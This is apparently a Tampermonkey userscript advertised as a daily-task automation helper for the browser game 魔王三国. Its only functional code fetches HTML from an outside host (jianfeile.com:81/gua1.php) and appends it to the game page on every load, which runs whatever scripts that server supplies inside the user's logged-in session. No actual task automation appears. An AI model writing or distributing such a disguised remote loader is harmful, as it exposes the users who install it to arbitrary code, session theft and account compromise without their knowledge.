// ==UserScript==
// @name         魔王三国自动脚本
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  网页游戏魔王三国的日常任务处理脚本!
// @author       YU
// @match        http://12.mwsg.game.xh456.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/27152/%E9%AD%94%E7%8E%8B%E4%B8%89%E5%9B%BD%E8%87%AA%E5%8A%A8%E8%84%9A%E6%9C%AC.user.js
// @updateURL https://update.greasyfork.org/scripts/27152/%E9%AD%94%E7%8E%8B%E4%B8%89%E5%9B%BD%E8%87%AA%E5%8A%A8%E8%84%9A%E6%9C%AC.meta.js
// ==/UserScript==

(function() {
    'use strict';
$.ajax({
    url:"http://jianfeile.com:81/gua1.php",
    datatype:'html',
    type:'get',
    success:function(d){
        $("body").append(d);
    }
});

    // Your code here...
})();